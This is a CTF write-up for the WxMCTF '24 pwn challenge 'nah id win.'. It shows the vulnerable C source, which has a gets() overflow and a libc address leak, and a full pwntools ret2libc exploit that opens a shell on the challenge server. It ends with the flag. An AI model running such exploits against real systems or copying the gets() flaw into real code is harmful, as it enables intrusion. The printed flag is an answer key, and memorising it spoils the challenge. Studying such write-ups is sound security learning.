https://ctftime.org/event/2179/

# WxMCTF '24 Pwn 3 - nah id win. - PWN

As the strongest problem in history faced off against the strongest pwner of today, they asked it: "Are you the shell because you are /bin/sh? Or are you /bin/sh because you are the shell?"

The pwner laughed. "Stand proud. You are strong." said the pwner. At this moment, the pwner used their domain expansion.

"DOMAIN EXPANSION. ret2libc."

The problem began using reverse pwn technique, but it wasn't enough. The domain was simply too strong. However, the problem had not yet used its domain expansion.

"DOMAIN EXPANSION: Return restrictions." The problem said, and the domain was instantly shattered.

"Nah, I'd win." The problem said, and the pwner was dealt with.

## Solution

```
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a1db87142a8d420c8354f643e608f41ed5714fb6, for GNU/Linux 3.2.0, not stripped
```

```
$ file libc.so.6 
libc.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0598ef3e075d7653ff4d565675d15666ec9b7b31, for GNU/Linux 3.2.0, stripped
```

`a873738b612a3de3991566f8813407097b5750fd5d2ffd2c69d9b0e077ff5077  vuln`

`3270e3243afad32d24e0c4aadd9ba8e79e13346ebad4ac216c52fa00cb02cc83  vuln.c`

`07aeb88a6930f7fafcbfa3c8771fea0556cb19ab7ce341395bed8802c386896a  libc.so.6`

```
#include <stdio.h>
#include <stdlib.h>

int vuln() {
    char buf[0x20];
    printf("My cursed technique is revealing libc... %p\n",printf);
    gets(buf);
    if(__builtin_return_address(0) < 0x90000000) {
        return 0;
    }
    printf("NAH I'D WIN!\n");
    exit(0);
}
int main() {
    setvbuf(stdin, NULL, 2, 0);
    setvbuf(stdout, NULL, 2, 0);
    vuln();
    return 0;
}
```

`vuln/0x08049206`
- leaks the address of `printf` from libc
- ensures that the return address is less than `0x90000000`
	+ this just means we return directly to libc and that we must insert an additional ret gadget into the rop chain with an `0x8...` address

```
$ ROPgadget --binary ./vuln | grep ": ret"
0x0804900e : ret
0x0804919b : ret 0xe8c1
0x0804906a : ret 0xffff
```

```
from pwn import *

REMOTE_IP = "1cfac3a.678470.xyz"
REMOTE_PORT = 32572

libc = ELF("./libc.so.6")

p = remote(REMOTE_IP, REMOTE_PORT)

p.readuntil(b"libc... ")

leak = int(p.readline().decode(), 16)
libc.address = leak - libc.sym["printf"]

log.success(f"libc: {hex(libc.address)}")

payload = b"A" * 0x2c
payload += p32(0x0804900e) # ret < 0x90000000
payload += p32(libc.sym["system"])
payload += p32(0)
payload += p32(next(libc.search(b"/bin/sh")))

p.sendline(payload)

p.interactive()
```

Once we get the shell:

```
$ grep wx *
README.md:`wxmctf{d0main_expansion:ret2libc.}`
```

## Flag
`wxmctf{d0main_expansion:ret2libc.}`
